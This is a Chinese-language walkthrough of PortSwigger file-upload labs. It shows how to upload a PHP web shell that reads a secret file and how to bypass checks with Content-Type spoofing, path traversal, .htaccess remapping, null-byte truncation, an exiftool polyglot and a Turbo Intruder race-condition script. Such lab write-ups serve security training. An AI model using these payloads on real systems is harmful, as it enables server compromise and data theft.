
## Remote code execution via web shell upload
```
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`
```

使用给定的账户密码登陆，点击上传头像的按钮，上传php文件：
```php
1. `<?php echo file_get_contents('/home/carlos/secret'); ?>`
```

![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714172911462.png)

返回并访问上传的文件链接：
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714173015727.png)

---
## Web shell upload via Content-Type restriction bypass
使用账户密码的登陆并上传php shell：`<?php echo file_get_contents('/home/carlos/secret'); ?> `，显示：
```
Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
```

再次上传，抓包并修改MIME
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714182527264.png)

```
The file avatars/mm3.php has been uploaded.
```

访问上传成功的php文件得到：
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714182643729.png)

---
## Web shell upload via path traversal
上传文件，修改文件名为`..%2fmm3.php`
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714184750372.png)

则上传文件访问路径从`/files/avatars/..%2fmm3.php`变为`/files/mm3.php`
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714184946038.png)


---
## Web shell upload via extension blacklist bypass

上传php文件提示无法上传
```
Sorry, php files are not allowed Sorry, there was an error uploading your file.
```

重新上传、抓包修改后缀为php5，可以上传，但是访问页面空白，说明没有解析
尝试上传`.htaccess`文件，并设置``AddType application/x-httpd-php .abc``,即会将`.abc`的后缀文件解析为php文件：
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714190428691.png)

再次上传`<?php echo file_get_contents('/home/carlos/secret'); ?>`的shell并修改后缀为abc:
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714190549141.png)

---
## Web shell upload via obfuscated file extension
上传php 文件提示如下：
```
Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.
```

将后缀修改为`mm3.php.png`，成功上传，但是无法执行命令
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714191406698.png)

那么，再次上传并使用`%00`进行截断：
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714191528381.png)

![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714191603639.png)

---
## Remote code execution via polyglot web shell upload

上传php文件，提示错误：
```
Error: file is not a valid image Sorry, there was an error uploading your file.
```

根据本题目的提示，我们执行下面命令：
```bash
`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" ./beef.png -o polyglot.php`
```

然后上传polyglot.php并访问:
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250714200027000.png)

---
## Web shell upload via race condition

直接登陆并上传php文件，提示：
```
Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.
```

查看题目源码：
```php
<?php $target_dir = "avatars/"; $target_file = $target_dir . $_FILES["avatar"]["name"]; // temporary move 
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file); 
if (checkViruses($target_file) && checkFileType($target_file)) {
echo "The file ". htmlspecialchars( $target_file). " has been uploaded."; } 
else { 
unlink($target_file); echo "Sorry, there was an error uploading your file."; http_response_code(403); 
} 
function checkViruses($fileName) { 
// checking for viruses ... 
} 
function checkFileType($fileName) {
$imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION)); if($imageFileType != "jpg" && $imageFileType != "png") { echo "Sorry, only JPG & PNG files are allowed\n"; return false; 
} 
else 
{ return true; } 
} ?>
```

文件在被删除之前时间极短，手动访问肯定是来不及的
安装Turbo Intruder插件，然后上传shell脚本并拦截，转发到Turbo Intruder,并为Turbo Intruder编写python脚本代码:
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250717110933245.png)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20,)

    request1 = '''POST /my-account/avatar HTTP/2
Host: 0ac5001e043d488093ac75f400d90071.web-security-academy.net
Cookie: session=6ceEgnzGZDPJhdUxnMhJ9owlAhxv4ffH
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------23366847436050054392067369933
Content-Length: 540
Origin: https://0ac5001e043d488093ac75f400d90071.web-security-academy.net
Dnt: 1
Sec-Gpc: 1
Referer: https://0ac5001e043d488093ac75f400d90071.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

-----------------------------23366847436050054392067369933
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------23366847436050054392067369933
Content-Disposition: form-data; name="user"

wiener
-----------------------------23366847436050054392067369933
Content-Disposition: form-data; name="csrf"

ccPKgZVp4rUg28kBKQVVVFv0eDbXBkf3
-----------------------------23366847436050054392067369933--
'''

    request2 = '''GET /files/avatars/shell.php HTTP/2
Host: 0ac5001e043d488093ac75f400d90071.web-security-academy.net
Cookie: session=6ceEgnzGZDPJhdUxnMhJ9owlAhxv4ffH
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Dnt: 1
Sec-Gpc: 1
Referer: https://0ac5001e043d488093ac75f400d90071.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
If-Modified-Since: Thu, 17 Jul 2025 03:02:55 GMT
If-None-Match: "39-63a173effa107"
Priority: u=5, i
Te: trailers


    '''

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```

实际功能就是上传shell,然后在被检查删除之前拼手速去请求暂时没有被删除的shell：
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250717113217808.png)
